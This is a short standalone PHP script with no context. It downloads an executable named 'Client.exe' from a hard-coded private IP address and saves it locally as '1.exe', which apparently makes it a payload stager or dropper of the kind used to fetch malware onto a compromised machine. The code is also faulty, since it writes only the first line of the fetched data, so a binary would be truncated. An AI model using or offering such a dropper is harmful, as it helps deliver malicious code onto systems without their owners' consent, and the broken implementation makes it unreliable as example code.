	#!/usr/bin/php 
	<?php $data = @file("http://192.168.1.192/Client.exe");
	$lf = "1.exe";         
	$fh = fopen($lf, 'w');         
	fwrite($fh, $data[0]);         
	fclose($fh); 
	?>